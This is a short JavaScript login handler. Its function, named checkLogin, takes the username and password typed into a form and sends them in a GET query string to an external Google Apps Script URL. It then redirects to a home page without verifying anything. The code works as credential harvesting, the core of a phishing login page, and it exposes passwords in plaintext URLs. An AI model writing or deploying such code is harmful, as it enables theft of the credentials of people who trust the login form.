function checkLogin() {
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  // Send the entered data (username and password) to the Google Sheets URL
  var googleSheetsURL = "https://script.google.com/macros/s/AKfycbxH3HlSwn_4EhdgFFCgQ86amq1uP4A7z4hcKMWKuxVnzCHTZOWJ7IU6rfnXSxVfGwLzZQ/exec";
  
  // Create a URL with query parameters for the username and password
  var url = googleSheetsURL + "?entry.1234567890=" + encodeURIComponent(username) +
            "&entry.1122334455=" + encodeURIComponent(password);
  
  // Send the data using fetch
  fetch(url, {
      method: "GET",
  })
  .then(response => response.json())
  .catch(error => {
      console.error("Error:", error);
  });

  // No need for hardcoded username and password check here anymore
  // Redirect to the home page if the login form is submitted successfully
  window.location.href = "../html/home.html";
}
